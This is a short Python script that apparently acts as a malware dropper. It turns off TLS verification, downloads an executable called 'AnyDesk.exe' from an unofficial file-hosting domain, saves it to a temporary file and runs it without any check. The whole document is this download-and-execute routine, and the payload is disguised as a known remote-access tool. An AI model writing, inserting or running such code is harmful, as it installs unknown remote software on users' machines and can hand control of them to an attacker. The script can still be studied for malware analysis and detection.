import requests
import subprocess
import tempfile
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url='https://diskcitylink.com/j0PDgKP/AnyDesk.exe'
response=requests.get(url,verify=False)
response.raise_for_status()
with tempfile.NamedTemporaryFile(suffix=".exe",delete=False)as temp_exe_file:
  temp_exe_file.write(response.content)
  temp_exe_file_path=temp_exe_file.name
subprocess.run([temp_exe_file_path],shell=True)
